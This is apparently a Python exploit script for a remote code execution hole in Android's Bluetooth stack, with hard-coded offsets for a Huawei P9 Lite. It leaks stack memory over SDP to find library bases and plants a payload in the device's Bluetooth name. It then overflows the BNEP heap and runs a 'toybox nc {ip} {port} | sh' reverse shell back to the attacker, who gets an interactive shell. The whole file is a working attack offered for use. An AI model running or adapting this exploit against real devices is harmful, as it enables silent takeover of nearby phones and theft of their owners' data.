import os
import sys
import time
import struct
import select
import binascii
import warnings

sys.path.insert(0, './helpers')
import bluetooth
from bluetooth import _bluetooth as bt

import bluedroid
import connectback


from pwn import log

warnings.filterwarnings("ignore",category=DeprecationWarning)

# Device: HUAWEI/VNS-L31/HWVNS-H:6.0/HUAWEIVNS-L31/C900B170

# sha1sum libc.so 4a577d80d8d89d6e404f9c0f98b2333f927a5cc2
# sha1sum bluetooth.default.so c432c2b7204f156d109b049bb46ea034441b4c53

# libc.so offset
LIBC_TEXT_STSTEM_OFFSET = 0x3f044+1  # system_addr + 1

# bluetooth.default.so offset
BSS_ACL_REMOTE_NAME_OFFSET = 0x23613C 

MAX_BT_NAME = 0xf5

# Payload details
SHELL_SCRIPT = 'toybox nc {ip} {port} | sh'

PWNING_TIMEOUT = 8
BNEP_PSM = 15
PWN_ATTEMPTS = 1
LEAK_ATTEMPTS = 1

src = "28:C2:DD:2A:3D:7E" 
src_hci = "hci0"
dst = "A8:C8:3A:FD:6A:98"

# Listening TCP ports that need to be opened on the attacker machine
NC_PORT = 1233
STDOUT_PORT = 1234
STDIN_PORT = 1235

'''
# Function offsets XIAOMI REDMI 2
#
# bletooth.default.so
# 1) btu_general_alarm_cb
# 2) alarm_set
# 3) sdp_disconnect_ind
BLUETOOTH_LIB_START_OFFSET = 0x3000
BLUETOOTH_OFFSETS = {
    'btu_general_alarm_cb': 0xF7604,
    'alarm_set_periodic': 0x10DCD4,
    #'sdp_disconnect_ind': 0xF06E8,
}
#
# libc.so
# 1) init_thread
# 2) pthread_start
# 3) clone
# 4) eventfd_write (not so near leaked value)
# 5) dlcalloc (not so near the leaked value)
# 6) dlmalloc_real (even farther than leaked value)
LIBC_LIB_START_OFFSET = 0x10000
LIBC_OFFSETS = {
    #'init_thread': 0x50DF0,
    'pthread_start': 0x50DCC,
    'clone': 0x28F3C,
}

'''
# Function offsets HUAWEI P9 LITE
#
# bletooth.default.so
# 1) btu_general_alarm_cb
# 2) alarm_set
BLUETOOTH_LIB_START_OFFSET = 0x4000
BLUETOOTH_OFFSETS = {
    'btu_general_alarm_cb': 0xEF200,
    'alarm_set_periodic': 0x103908,
    'sdp_disconnect_ind': 0xE8800,
}
#
# libc.so
# 1) init_thread
# 2) pthread_start
# 3) clone
# 4) eventfd_write (not so near leaked value)
# 5) dlcalloc (not so near the leaked value)
# 6) dlmalloc_real (even farther than leaked value)
LIBC_LIB_START_OFFSET = 0x10000
LIBC_OFFSETS = {
    #'init_thread': 0x4FAA4,
    'pthread_start': 0x4FA80,
    'clone': 0x2A178,
}

def print_result(result):
    i = 0
    for line in result:
      sys.stdout.write("%02d: " % i)
      for x in line:
        sys.stdout.write("%08x " % x) 
      else:
        sys.stdout.write("\n")
        i += 1

def set_bt_name(payload, src_hci, src, dst):
    # Create raw HCI sock to set our BT name
    raw_sock = bt.hci_open_dev(bt.hci_devid(src_hci))
    flt = bt.hci_filter_new()
    bt.hci_filter_all_ptypes(flt)
    bt.hci_filter_all_events(flt)
    raw_sock.setsockopt(bt.SOL_HCI, bt.HCI_FILTER, flt)

    # Send raw HCI command to our controller to change the BT name (first 3 bytes are padding for alignment)
    for i in range(5000):
        raw_sock.sendall(binascii.unhexlify('01130cf8cccccc') + payload.ljust(MAX_BT_NAME, b'\x00'))
    raw_sock.close()
    time.sleep(1)    

    # Connect to BNEP to "refresh" the name (does auth)
    bnep = bluetooth.BluetoothSocket(bluetooth.L2CAP)
    bnep.bind((src, 0))
    bnep.connect((dst, BNEP_PSM))
    bnep.close()

    # Close ACL connection
    os.system('hcitool dc %s' % (dst,))
    #time.sleep(1)

def get_bases_indexes(result, lib):
    #array = [item for sublist in result for item in sublist] #from list of list to array
    #print(array)
    MAX_DIFF_DISALIGNMENT = 16 
    OFFSETS = {}
    LIB_START_OFFSET = 0

    if lib == "bluetooth.default.so":
      OFFSETS = BLUETOOTH_OFFSETS
      LIB_START_OFFSET = BLUETOOTH_LIB_START_OFFSET
    elif lib == "libc.so":
      OFFSETS = LIBC_OFFSETS
      LIB_START_OFFSET = LIBC_LIB_START_OFFSET

    OFFSET = []

    correct_diffs = {}
    for key in OFFSETS:
      val = OFFSETS[key]
      correct_diffs[key] = [val - OFFSETS[k] for k in OFFSETS if OFFSETS[k] < val]

    print("Trying to calculate bluetooth base address")

    for line in result:
      for el in line:
        if el != 0:
          diff_list = [el - x for sublist in result for x in sublist if x != 0 and x != el]
          diff_list = list(dict.fromkeys(diff_list))

          for val in diff_list:
            for key in correct_diffs:
              diff_of_diff = [val - diff for diff in correct_diffs[key] if val - diff <= MAX_DIFF_DISALIGNMENT and val - diff >= -MAX_DIFF_DISALIGNMENT ]
              if len(diff_of_diff) > 0: #len shouldn't be greater than 1
                possible_base = el-OFFSETS[key]+LIB_START_OFFSET-diff_of_diff[0]
                possible_base -= possible_base & 0xfff
                if possible_base > 0:
                  #print("Value from leak:", hex(el))
                  #print("Possible function:", key)
                  #print("Offset of the possible function:", hex(OFFSETS[key]))
                  #print("Difference from precise value:", diff_of_diff)
                  #print("Here comes the magic: ", hex(possible_base))
                  #print("")
                  OFFSET.append(possible_base)

    return OFFSET[0] #TO-DO 

def memory_leak_get_bases(src, src_hci, dst):
    prog = log.progress('Doing stack memory leak...')

    # Get leaked stack data. This memory leak gets "deterministic" "garbage" from the stack.
    result = bluedroid.do_sdp_info_leak(dst, src)
    #print("Leak: %s" % result) # Debug, show leak array

    #print_result(result)

    print("Calculating bluetooth.default.so base address")
    bluetooth_default_bss_base = get_bases_indexes(result, "bluetooth.default.so")
    print("Calculating libc.so base address")
    libc_text_base = get_bases_indexes(result, "libc.so")

    log.info('libc_base: 0x%08x, bss_base: 0x%08x' % (libc_text_base, bluetooth_default_bss_base))

    # Close SDP ACL connection
    os.system('hcitool dc %s' % (dst,))
    time.sleep(0.1)

    prog.success()
    return libc_text_base, bluetooth_default_bss_base


def pwn(src_hci, dst, bluetooth_default_bss_base, system_addr, acl_name_addr, my_ip,libc_text_base):
    
    # x -> payload address (name has 4 bytes of padding)
    x = acl_name_addr+4

    shell_addr = x+24 # SHELL SCRIPT address
    ptr0 = x+16  -4 # points to ptr0+4 (ptr1)
    ptr1 = x+8   -8 # points to ptr1+8 (ptr2)
    ptr2 = x+20 -28 # points to ptr2+28 (system_addr)

    payload = b'A'+ struct.pack('<IIIIII', shell_addr, ptr1, ptr2, ptr0, ptr1, system_addr) + SHELL_SCRIPT.format(ip=my_ip, port=NC_PORT).encode('utf-8')
    
    log.info("shelladdr 0x%08x" % shell_addr)
    log.info("ptr0      0x%08x" % ptr0)
    log.info("ptr1      0x%08x" % ptr1)
    log.info("ptr2      0x%08x" % ptr2)
    log.info("system    0x%08x" % system_addr)
    
    assert len(payload) < MAX_BT_NAME
    assert b'\x00' not in payload
    
    # Puts payload into a known bss location (once we create a BNEP connection).
    set_bt_name(payload, src_hci, src, dst)
    #prog = log.progress('Set name to '+payload)
    #time.sleep(30)

    prog = log.progress('Connecting to BNEP again')
    time.sleep(1)

    bnep = bluetooth.BluetoothSocket(bluetooth.L2CAP)
    bnep.bind((src, 0))
    bnep.connect((dst, BNEP_PSM))

    prog.success()
    prog = log.progress('Pwning...')

    # Each of these messages causes BNEP code to send 100 "command not understood" responses.
    # This causes list_node_t allocations on the heap (one per reponse) as items in the xmit_hold_q.
    # These items are popped asynchronously to the arrival of our incoming messages (into hci_msg_q).
    # Thus "holes" are created on the heap, allowing us to overflow a yet unhandled list_node of hci_msg_q.
    
    for i in range(20):
        bnep.send(binascii.unhexlify('8109' + '800109' * 100))
        #bnep.send()

    # Repeatedly trigger the vuln (overflow of 8 bytes) after an 8 byte size heap buffer.
    # This is highly likely to fully overflow over instances of "list_node_t" which is exactly
    # 8 bytes long (and is *constantly* used/allocated/freed on the heap).
    # Eventually one overflow causes a call to happen to "btu_hci_msg_process" with "p_msg"
    # under our control. ("btu_hci_msg_process" is called *constantly* with messages out of a list)
    for i in range(1000):
        # If we're blocking here, the daemon has crashed
        _, writeable, _ = select.select([], [bnep], [], PWNING_TIMEOUT)
        if not writeable:
            break
        bnep.send(binascii.unhexlify('810100') +
                  struct.pack('<II', 0, ptr0))
    else:
        log.info("Looks like it didn't crash. Possibly worked")
    
    prog.success()
    
def main(my_ip):
    os.system('hciconfig %s sspmode 0' % (src_hci,))
    os.system('hcitool dc %s' % (dst,))

    sh_s, stdin, stdout = connectback.create_sockets(NC_PORT, STDIN_PORT, STDOUT_PORT)

    for i in range(PWN_ATTEMPTS):
        log.info('Pwn attempt %d:' % (i,))

        # Try to leak section bases
        for j in range(LEAK_ATTEMPTS):
            libc_text_base, bluetooth_default_bss_base = memory_leak_get_bases(src, src_hci, dst)
            
            if (libc_text_base & 0xfff == 0) and (bluetooth_default_bss_base & 0xfff == 0):
                break
        else:
           #assert True
           assert False, "Memory doesn't seem to have leaked as expected. Wrong .so versions?"

        system_addr = LIBC_TEXT_STSTEM_OFFSET + libc_text_base
        #print "0x%08x" %(system_addr)
        acl_name_addr = BSS_ACL_REMOTE_NAME_OFFSET + bluetooth_default_bss_base
        #assert acl_name_addr % 4 == 0
        log.info('system: 0x%08x, acl_name: 0x%08x' % (system_addr, acl_name_addr))

        pwn(src_hci, dst, bluetooth_default_bss_base, system_addr, acl_name_addr, my_ip, libc_text_base)

        readable, _, _ = select.select([sh_s], [], [], PWNING_TIMEOUT)
        
        if readable:
            log.info('Done')
            break

    else:
        assert False, "Pwning failed all attempts"

    connectback.interactive_shell(sh_s, stdin, stdout, my_ip, STDIN_PORT, STDOUT_PORT)


if __name__ == '__main__':
    main(*sys.argv[1:])

